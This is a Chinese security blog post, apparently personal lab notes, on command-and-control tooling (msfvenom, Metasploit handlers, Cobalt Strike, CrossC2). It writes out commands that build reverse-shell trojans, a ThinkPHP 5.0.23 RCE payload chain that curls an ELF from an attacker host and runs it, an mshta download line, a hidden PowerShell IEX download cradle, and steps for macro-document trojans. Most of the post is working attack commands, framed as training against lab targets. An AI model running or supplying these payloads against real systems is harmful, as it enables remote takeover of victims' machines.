+<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><h2 id="生成-windows-木马"><a href="#生成-windows-木马" class="headerlink" title="生成 windows 木马"></a>生成 windows 木马</h2><p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=攻击机ip lport=攻击机端口 -f exe -o 文件名.exe  </code></p>
+<p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.2.153 lport=7586 -f exe -o 123.exe</code></p>
+<ul>
+<li>-p payload</li>
+<li>-f 格式</li>
+<li>-o 输出的文件名</li>
+</ul>
+<h3 id="msfconsole-开监听"><a href="#msfconsole-开监听" class="headerlink" title="msfconsole 开监听"></a>msfconsole 开监听</h3><p><code>handler -p 上面生成时用的payload -H 上面生成时用的ip -P 上面生成时用的端口 </code></p>
+<p><code>handler -p  windows/x64/meterpreter/reverse_tcp -H 192.168.2.153 -P 7586</code></p>
+<h3 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h3><p> 受害者运行 exe，即可上线 <code>meterpreter  </code></p>
+<h2 id="生成-linux-木马"><a href="#生成-linux-木马" class="headerlink" title="生成 linux 木马"></a>生成 linux 木马</h2><p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.2.153 lport=7586 -f elf -o 123.elf </code></p>
+<p> 一样的开启监听，受害者运行 elf 即可</p>
+<p><code>handler -p  linux/x64/meterpreter/reverse_tcp -H 192.168.2.153 -P 7586</code></p>
+<p><code>chmod +x 123.elf</code></p>
+<p><code>./123.elf</code></p>
+<h2 id="staged-payload-和-stageless-payload"><a href="#staged-payload-和-stageless-payload" class="headerlink" title="staged payload 和 stageless payload"></a>staged payload 和 stageless payload</h2><p>查看 msfvenom 支持哪些 payload</p>
+<p> <code>msfvenom --list payloads</code></p>
+<ul>
+<li>**windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp **（staged payload 分段式 payload）</li>
+<li><strong>windows&#x2F;x64&#x2F;meterpreter_reverse_tcp</strong> （stageless payload 无分段 payload ）</li>
+</ul>
+<h3 id="区别："><a href="#区别：" class="headerlink" title="区别："></a>区别：</h3><ul>
+<li>分段式的木马，是一个下载器，上线时需下载 stage 到内存中</li>
+<li>无分段的木马，是一个完整的木马</li>
+</ul>
+<p><code>**handler -p  windows/x64/meterpreter/reverse_tcp -H 192.168.2.153 -P 7586 **</code></p>
+<p><code>**handler -p  windows/x64/meterpreter_reverse_tcp -H 192.168.2.153 -P 7585 **</code></p>
+<h2 id="操作：RCE-漏洞-meterpreter"><a href="#操作：RCE-漏洞-meterpreter" class="headerlink" title="操作：RCE 漏洞 meterpreter"></a>操作：RCE 漏洞 meterpreter</h2><p><code>https://github.com/vulhub/vulhub/blob/master/thinkphp/5.0.23-rce/README.zh-cn.md</code></p>
+<h3 id="1-攻击机生成-elf-木马"><a href="#1-攻击机生成-elf-木马" class="headerlink" title="1  攻击机生成 elf 木马"></a>1  攻击机生成 elf 木马</h3><p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.2.153 lport=7586 -f elf -o 123.elf</code></p>
+<h3 id="2-攻击机开启监听"><a href="#2-攻击机开启监听" class="headerlink" title="2  攻击机开启监听"></a>2  攻击机开启监听</h3><p><code>handler -p  linux/x64/meterpreter/reverse_tcp -H 192.168.2.153 -P 7586</code></p>
+<h3 id="3-攻击机开http下载链接"><a href="#3-攻击机开http下载链接" class="headerlink" title="3  攻击机开http下载链接"></a>3  攻击机开http下载链接</h3><p><code>python -m http.server</code></p>
+<h3 id="4-攻击漏洞-（-thinkphp-5-0-23-rce-）"><a href="#4-攻击漏洞-（-thinkphp-5-0-23-rce-）" class="headerlink" title="4  攻击漏洞 （ thinkphp 5.0.23 rce ）"></a>4  攻击漏洞 （ thinkphp 5.0.23 rce ）</h3><p><code>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=curl http://192.168.79.120:8000/123.elf -o /tmp/123.elf</code></p>
+<p><code>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=chmod 777 /tmp/123.elf</code></p>
+<p><code>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=/tmp/123.elf</code></p>
+<h3 id="5-上线"><a href="#5-上线" class="headerlink" title="5 上线"></a>5 上线</h3><h2 id="CobalStrike"><a href="#CobalStrike" class="headerlink" title="CobalStrike"></a>CobalStrike</h2><p>cs 也是 c2工具，基于图形化界面，有客户端和服务器两部分组成</p>
+<h2 id="Server-服务端"><a href="#Server-服务端" class="headerlink" title="Server 服务端"></a>Server 服务端</h2><p>有java 的设备上即可运行，默认端口 **50050  **</p>
+<p><code>**./teamserver 192.168.2.153 123456**</code></p>
+<p><code>**如果想修改端口，直接编辑 teamserver 文件即可  **</code></p>
+<h2 id="Client-客户端"><a href="#Client-客户端" class="headerlink" title="Client 客户端"></a>Client 客户端</h2><p>有java 的设备上即可运行  （<strong>不行的话 切换 jdk 版本</strong>）</p>
+<h2 id="Listenter-监听器"><a href="#Listenter-监听器" class="headerlink" title="Listenter 监听器"></a>Listenter 监听器</h2><h2 id="Payload-生成木马文件"><a href="#Payload-生成木马文件" class="headerlink" title="Payload 生成木马文件"></a>Payload 生成木马文件</h2><h3 id="stager-payload-stageless-payload"><a href="#stager-payload-stageless-payload" class="headerlink" title="stager payload &#x2F; stageless payload"></a>stager payload &#x2F; stageless payload</h3><p><code>stager payload</code></p>
+<p><code>stageless payload</code></p>
+<h3 id="HTML-application"><a href="#HTML-application" class="headerlink" title="HTML application"></a>HTML application</h3><h4 id="HTA-是windows-html的"><a href="#HTA-是windows-html的" class="headerlink" title="HTA 是windows html的"></a><code>HTA 是windows html的</code></h4><h4 id="一种应用程序"><a href="#一种应用程序" class="headerlink" title="一种应用程序"></a><code>一种应用程序</code></h4><h4 id="支持在-hta-里封装-vbs-脚本"><a href="#支持在-hta-里封装-vbs-脚本" class="headerlink" title="支持在 hta 里封装 vbs 脚本"></a><code>支持在 hta 里封装 vbs 脚本</code></h4><h4 id="vbs-脚本再触发-powershell"><a href="#vbs-脚本再触发-powershell" class="headerlink" title="vbs 脚本再触发 powershell "></a><code>vbs 脚本再触发 powershell </code></h4><p> cobaltstrike 中 类似 <code>**python -m http.server **</code>的功能 <code>**Host File**  </code></p>
+<p> **复制链接 **</p>
+<p><code>http://192.168.2.153:80/han</code></p>
+<p>如果忘记复制链接，可以到 Manage 里重新复制</p>
+<p><code>mshta 复制的拦截  </code></p>
+<p><code>mshta http://192.168.2.153:80/han</code></p>
+<h3 id="web-delivery"><a href="#web-delivery" class="headerlink" title="web delivery"></a>web delivery</h3><p><code>复制链接并在靶机(cmd 上)执行即可上线 beacon  </code></p>
+<p><code>powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.2.153:1245/hansdxx&#39;))&quot;</code></p>
+<h3 id="office-宏木马"><a href="#office-宏木马" class="headerlink" title="office 宏木马"></a>office 宏木马</h3><p>**windows office 支持宏脚本，宏脚本 vbs ，vbs 可以嵌套powershell  **</p>
+<p><strong>跟着步骤操作</strong></p>
+<p><code>受害者打开 docm 文件，即可上线  </code></p>
+<h4 id="beacon"><a href="#beacon" class="headerlink" title="beacon"></a>beacon</h4><p><code>双击exe即可上线 beacon  </code></p>
+<h4 id="interact-执行系统命令"><a href="#interact-执行系统命令" class="headerlink" title="interact  执行系统命令"></a>interact  执行系统命令</h4><pre><code class="hljs plain">shell   系统命令
+shell   whoami
+shell   dir
+shell   net  user</code></pre>
+
+<h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h4><p><strong>默认 sleep 的时间是  1 min</strong></p>
+<p>**修改 sleep 的时间  **</p>
+<pre><code class="hljs plain">sleep  秒数
+sleep  1
+sleep  0</code></pre>
+
+<h4 id="文件浏览器"><a href="#文件浏览器" class="headerlink" title="文件浏览器"></a>文件浏览器</h4><h4 id="进程列表"><a href="#进程列表" class="headerlink" title="进程列表"></a>进程列表</h4><h4 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h4><h4 id="vnc"><a href="#vnc" class="headerlink" title="vnc"></a>vnc</h4><h5 id="只读模式"><a href="#只读模式" class="headerlink" title="只读模式"></a>只读模式</h5><h5 id="控制模式"><a href="#控制模式" class="headerlink" title="控制模式"></a>控制模式</h5><h4 id="退出和删除"><a href="#退出和删除" class="headerlink" title="退出和删除"></a>退出和删除</h4><h2 id="cobaltstrike-和-meterpreter"><a href="#cobaltstrike-和-meterpreter" class="headerlink" title="cobaltstrike 和 meterpreter"></a>cobaltstrike 和 meterpreter</h2><h3 id="msf-meterpreter-转-cs-beacon"><a href="#msf-meterpreter-转-cs-beacon" class="headerlink" title="msf meterpreter 转 cs beacon"></a><code>msf meterpreter 转 cs beacon</code></h3><h4 id="1-上线-meterpreter"><a href="#1-上线-meterpreter" class="headerlink" title="1 上线 meterpreter"></a>1 上线 <code>meterpreter</code></h4><p>**msfvenom 生成木马 -&gt; msfconsole handler 开启监听 -&gt; 双击木马上线 **</p>
+<h4 id="2-CS创建HTTP监听器"><a href="#2-CS创建HTTP监听器" class="headerlink" title="2 CS创建HTTP监听器"></a>2 CS创建HTTP监听器</h4><h4 id="3-msfconsole使用模块exploit"><a href="#3-msfconsole使用模块exploit" class="headerlink" title="3 msfconsole使用模块exploit"></a>3 msfconsole使用模块exploit</h4><h4 id="windows-local-payload-inject"><a href="#windows-local-payload-inject" class="headerlink" title="&#x2F;windows&#x2F;local&#x2F;payload_inject"></a>&#x2F;windows&#x2F;local&#x2F;payload_inject</h4><p><code>set payload windows/meterpreter/reverse_http</code></p>
+<p><code>set lhost 192.168.2.153</code></p>
+<p><code>set lport 1234</code></p>
+<p><code>set disablepayloadhandler true</code></p>
+<h4 id="4-cs-即可收到-beacon"><a href="#4-cs-即可收到-beacon" class="headerlink" title="4 cs 即可收到 beacon"></a>4 cs 即可收到 beacon</h4><h3 id="cs-beacon-转-msf-meterpreter"><a href="#cs-beacon-转-msf-meterpreter" class="headerlink" title="cs beacon 转 msf meterpreter"></a>cs beacon 转 msf meterpreter</h3><h4 id="1-上线-beacon"><a href="#1-上线-beacon" class="headerlink" title="1  上线 beacon"></a>1  上线 beacon</h4><h4 id="2-msfconsole-开启监听"><a href="#2-msfconsole-开启监听" class="headerlink" title="2  msfconsole 开启监听"></a>2  msfconsole 开启监听</h4><p>⚠️  <strong>-H 需要是 msf 的ip地址 -P 随机</strong></p>
+<p><code>handler -p  windows/meterpreter/reverse_http -H 192.168.2.169 -P 2456</code></p>
+<h4 id="3-cs-创建外部监听器"><a href="#3-cs-创建外部监听器" class="headerlink" title="3  cs 创建外部监听器"></a>3  cs 创建外部监听器</h4><h4 id="4-选择要发送的-beacon，"><a href="#4-选择要发送的-beacon，" class="headerlink" title="4  选择要发送的 beacon，"></a>4  选择要发送的 beacon，</h4><h4 id="spawn-并选择刚刚的外部监听器"><a href="#spawn-并选择刚刚的外部监听器" class="headerlink" title="spawn 并选择刚刚的外部监听器"></a>spawn 并选择刚刚的外部监听器</h4><h4 id="5-msf-收到-meterpreter"><a href="#5-msf-收到-meterpreter" class="headerlink" title="5  msf 收到 meterpreter"></a>5  msf 收到 meterpreter</h4><p>⚠️  x86 的 meterpreter 用在 x64 的系统中，大部分的功能都可以正常使用 （有部分功能用不 了），如果想变为 x64 的 meterpreter ，可以进行进程迁移</p>
+<p><code>sessions   -u   会话的ID</code></p>
+<p> 新上线的meterpreter就是 x64 的了</p>
+<h2 id="CNA-插件"><a href="#CNA-插件" class="headerlink" title="CNA 插件"></a>CNA 插件</h2><h3 id="综合渗透插件-LSTAR"><a href="#综合渗透插件-LSTAR" class="headerlink" title="综合渗透插件 LSTAR"></a>综合渗透插件 <code>LSTAR</code></h3><p> <code>https://github.com/lintstar/LSTAR  </code></p>
+<p><code>-Dfile.encoding=UTF-8</code></p>
+<h3 id="CrossC2"><a href="#CrossC2" class="headerlink" title="CrossC2"></a>CrossC2</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><h5 id="让-cs-支持-linux-、macos-攻击"><a href="#让-cs-支持-linux-、macos-攻击" class="headerlink" title="让 cs 支持 linux 、macos 攻击"></a>让 cs 支持 linux 、macos 攻击</h5><h4 id="1-安装编辑"><a href="#1-安装编辑" class="headerlink" title="1 安装编辑"></a>1 安装编辑</h4><p>⚠️  编辑 CrossC2-GithubBot-2023-11-20.cna</p>
+<p><code>**$CC2_PATH = &quot;D:\\32550\\aq\\CobaltStrike4.8\\genCrossC2.Win\\&quot;; # &lt;-------- fix**</code></p>
+<p><code>**$CC2_BIN = &quot;genCrossC2.exe&quot;;**</code></p>
+<p>改动CC2_PATH 为 genCrossC2.exe所在的绝对路径</p>
+<p>改动 CC2_BIN 为 genCrossC2.exe</p>
+<h4 id="2-依次导入"><a href="#2-依次导入" class="headerlink" title="2 依次导入"></a>2 依次导入</h4><p><code>CrossC2-GithubBot-2023-11-20.cna</code></p>
+<p><code>CrossC2Kit.cna</code></p>
+<p><code>CrossC2Kit_Loader.cna</code></p>
+<h4 id="3-把-teamserver-上的-隐藏文件"><a href="#3-把-teamserver-上的-隐藏文件" class="headerlink" title="3  把 teamserver 上的 隐藏文件"></a>3  把 teamserver 上的 隐藏文件</h4><h4 id="cobaltstrike-beacon-keys"><a href="#cobaltstrike-beacon-keys" class="headerlink" title=".cobaltstrike.beacon_keys"></a>.cobaltstrike.beacon_keys</h4><h4 id="传输到-cobaltstrike-客户端文件夹中"><a href="#传输到-cobaltstrike-客户端文件夹中" class="headerlink" title="传输到 cobaltstrike 客户端文件夹中"></a>传输到 cobaltstrike 客户端文件夹中</h4><h3 id="使用-（生成linux木马并上线）"><a href="#使用-（生成linux木马并上线）" class="headerlink" title="使用 （生成linux木马并上线）"></a>使用 （生成linux木马并上线）</h3><h4 id="1-cs-中创建一个-https-的监听器"><a href="#1-cs-中创建一个-https-的监听器" class="headerlink" title="1  cs 中创建一个 https 的监听器"></a>1  cs 中创建一个 https 的监听器</h4><h4 id="2-使用-crossC2-生成木马"><a href="#2-使用-crossC2-生成木马" class="headerlink" title="2  使用 crossC2 生成木马"></a>2  使用 crossC2 生成木马</h4><h4 id="生成的木马保存位置在"><a href="#生成的木马保存位置在" class="headerlink" title="生成的木马保存位置在"></a>生成的木马保存位置在</h4><h4 id="cobaltstrike-的客户端文件夹中"><a href="#cobaltstrike-的客户端文件夹中" class="headerlink" title="cobaltstrike 的客户端文件夹中"></a>cobaltstrike 的客户端文件夹中</h4><h4 id="3-把-elf-木马传给-linux-靶机"><a href="#3-把-elf-木马传给-linux-靶机" class="headerlink" title="3  把 elf 木马传给 linux 靶机"></a>3  把 elf 木马传给 linux 靶机</h4><h4 id="并运行，即可上线-linux-beacon"><a href="#并运行，即可上线-linux-beacon" class="headerlink" title="并运行，即可上线 linux beacon"></a>并运行，即可上线 linux beacon</h4>
+      </div>
+
+      
+      <div class="article__tags reveal">
+        <span class="article__tags-label">标签</span>
+        <div class="tag-list">
+          
+            <a href="/tags/C2/"><span>C2</span></a>
+          
+            <a href="/tags/Cobalt-Strike/"><span>Cobalt Strike</span></a>
+          
+            <a href="/tags/%E8%BF%9C%E6%8E%A7/"><span>远控</span></a>
+          
+        </div>
+      </div>
+      
+
+      <nav class="post-nav reveal" aria-label="前后文章">
+        
+          <a class="post-nav__prev" href="/intranet-proxy-tunnels/">
+            <span>← 上一篇</span>
+            <strong>内网代理与隧道技术</strong>
+          </a>
+        
+        
+          <a class="post-nav__next" href="/frontend-encryption-analysis/">
+            <span>下一篇 →</span>
+            <strong>前端加解密场景下的渗透测试</strong>
+          </a>
+        
+      </nav>
+
+      
+      <div class="reward reveal">
+        <button type="button" class="reward__toggle" data-reward-toggle>
+          <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2v20M2 7h20v10H2z"/><path d="M12 2a7 7 0 0 1 0 10M12 12a7 7 0 0 0 0 10"/></svg>
+          打赏
+        </button>
+        <div class="reward__box" data-reward-box>
+          <p class="reward__title">你的赏识是我前进的动力</p>
+          <div class="reward__qrs">
+            
+              <figure><img src="/medias/reward/wechat.png" alt="微信赞赏码" loading="lazy"><figcaption>微信</figcaption></figure>
+            
+            
+              <figure><img src="/medias/reward/alipay.jpg" alt="支付宝收款码" loading="lazy"><figcaption>支付宝</figcaption></figure>
+            
+          </div>
+        </div>
+      </div>
+      
+
+      
+      <div class="cbox reveal" id="comments">
+        <div class="cbox__head"><span class="cbox__title">评论</span></div>
+        <div id="gitalk-container"></div>
+      </div>
+      
+    </div>
+  </div>
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="site-footer__inner">
+    <div class="site-footer__id">
+      <img class="site-footer__avatar" src="/images/clay-avatar.svg" alt="swfk2154" loading="lazy">
+      <div class="site-footer__id-text">
+        <strong>swfk 的安全笔记</strong>
+        <span>AI 安全 / 网络安全 / 工程实践</span>
+      </div>
+    </div>
+    <div class="site-footer__links">
+      
+        <a href="https://github.com/swfk2154" target="_blank" rel="noopener noreferrer">
+          <svg viewBox="0 0 24 24" width="15" height="15" fill="currentColor" aria-hidden="true"><path d="M12 .5C5.65.5.5 5.65.5 12a11.5 11.5 0 0 0 7.86 10.92c.58.11.79-.25.79-.56v-2c-3.2.7-3.88-1.54-3.88-1.54-.53-1.33-1.28-1.69-1.28-1.69-1.04-.71.08-.7.08-.7 1.15.08 1.76 1.18 1.76 1.18 1.03 1.75 2.7 1.25 3.36.95.1-.74.4-1.25.72-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.26.45-2.28 1.18-3.09-.12-.29-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.74 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.76.11 3.05.74.81 1.18 1.83 1.18 3.09 0 4.41-2.69 5.38-5.26 5.66.41.36.78 1.06.78 2.14v3.17c0 .31.21.68.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5z"/></svg>
+          GitHub
+        </a>
+      
+      
+      
+        <a href="/atom.xml">
+          <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 11a9 9 0 0 1 9 9"/><path d="M4 4a16 16 0 0 1 16 16"/><circle cx="5" cy="19" r="1.4"/></svg>
+          RSS
+        </a>
+      
+    </div>
+  </div>
+  <div class="site-footer__bar">
+    <span>© 2026 - 2026 swfk2154</span>
+    <span>由 <a href="https://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a> 驱动 · Clay 主题</span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display:none">访客 <span id="busuanzi_value_site_uv"></span></span>
+      <span id="busuanzi_container_site_pv" style="display:none">浏览 <span id="busuanzi_value_site_pv"></span></span>
+    
+  </div>
+</footer>
+
+  
+<div class="search-overlay" id="search-overlay" hidden>
+  <div class="search-panel" role="dialog" aria-modal="true" aria-label="站内搜索">
+    <div class="search-bar">
+      <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      <input type="text" class="search-input" id="search-input" placeholder="搜索文章：标题 / 标签 / 正文…"
+             autocomplete="off" autocapitalize="off" spellcheck="false">
+      <button type="button" class="search-esc" data-search-close aria-label="关闭搜索">Esc</button>
+    </div>
+    <ul class="search-results" id="search-results"></ul>
+    <div class="search-hint">↑ ↓ 选择 · Enter 打开 · Esc 关闭</div>
+  </div>
+</div>
+
+  <button type="button" class="to-top" aria-label="回到顶部">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 19V5M6 11l6-6 6 6"/></svg>
+  </button>
+  
+
+<div class="music-player" data-music-player>
+  <button type="button" class="music-player__toggle" data-music-toggle aria-expanded="false" aria-controls="music-player-panel" aria-label="打开音乐播放器" title="音乐">
+    <span class="music-player__disc" aria-hidden="true">
+      <img class="music-player__disc-cover" data-music-cover alt="" hidden referrerpolicy="no-referrer">
+      <svg class="music-player__disc-note" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>
+    </span>
+    <span class="music-player__pulse" aria-hidden="true"><i></i><i></i><i></i></span>
+  </button>
+
+  <section class="music-player__panel" id="music-player-panel" data-music-panel aria-hidden="true">
+    <div class="music-player__panel-head">
+      <div class="music-player__head-copy">
+        <span class="music-player__eyebrow">MUSIC</span>
+        <h2>BGM</h2>
+      </div>
+      <button type="button" class="music-player__close" data-music-close aria-label="收起">&#215;</button>
+    </div>
+    
+    <div class="music-player__box">
+      
+      <div class="music-player__pane is-active" data-music-pane="0">
+        <div class="music-player__mount" data-ap-mount="0"></div>
+      </div>
+      
+      
+    </div>
+    <p class="music-player__foot">来自网易云音乐 · 点击列表选曲</p>
+  </section>
+  <script>window.__CLAY_MUSIC__ = {"apis":["https://api.injahow.cn/meting/?server=:server&type=:type&id=:id","https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id"],"sources":[{"server":"netease","type":"playlist","id":"8792942606"}],"order":"list","listMaxHeight":"320px","autoplay":false};</script>
+</div>
+
+
+  
+<script>
+  window.__giscusConfig = {"enable":true,"repo":"swfk2154/swfk2154.github.io","repoId":"R_kgDORBu9qA","category":"Announcements","categoryId":"DIC_kwDORBu9qM4DEDSm","mapping":"pathname","reactionsEnabled":true,"inputPosition":"top","theme":"light","lang":"zh-CN"};
+</script>
+
+<script src="/js/clay.js"></script>
+<script src="/js/search.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="/js/music-loader.js"></script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
